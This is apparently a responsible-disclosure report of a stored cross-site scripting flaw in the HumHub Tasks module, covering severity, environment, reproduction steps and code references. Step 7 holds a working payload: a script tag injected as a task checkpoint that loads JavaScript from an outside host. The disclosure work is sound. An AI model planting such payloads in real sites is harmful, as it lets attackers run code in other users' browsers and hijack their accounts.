## Severity

CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N

## Environment

HumHub Professional Edition Demo version `1.18.1`, at https://lassitesting.humhub.com

Tasks module version `1.9.2`

Created at https://saas.humhub.com/en/create on 23.2.2026, updated to `1.18.1` on 3.3.2026 by the lovely HumHub team.

## Steps to reproduce

1. Log in to your **HumHub** instance with an administrator user. In this example, the default `admin` account was used
2. Navigate to **top-right menu > Administration > Modules** and install the **Tasks** module if not already installed
3. Navigate to a space of your choosing, in this example the default **Welcome Space**
4. From the right corner gear menu, select **Settings** and **Enable** the **Tasks** module
5. Navigate to the **Tasks** module and click on the **green plus-icon**
6. Fill anything as the **Title**
7. On the **Checkpoints** tab, add the following XSS payload as a checkpoint and click **Save**:
```html
"><script src=https://useful-writer.surge.sh/alert_domain.js></script>
```
8. Open the created **Task** and XSS fires:
![](attachments/Pasted%20image%2020260313212819.png)

Note that by default, normal users in a space are also able to create arbitrary tasks and thus insert XSS payloads.

## Code References

https://github.com/humhub/tasks/blob/12965eb9ad125577617d03164332b965d52f9950/widgets/checklist/views/taskChecklist.php#L24
https://github.com/humhub/tasks/blob/12965eb9ad125577617d03164332b965d52f9950/widgets/checklist/views/taskChecklistItem.php#L27
## External references

https://cwe.mitre.org/data/definitions/79.html
https://owasp.org/www-community/attacks/xss/
https://portswigger.net/web-security/cross-site-scripting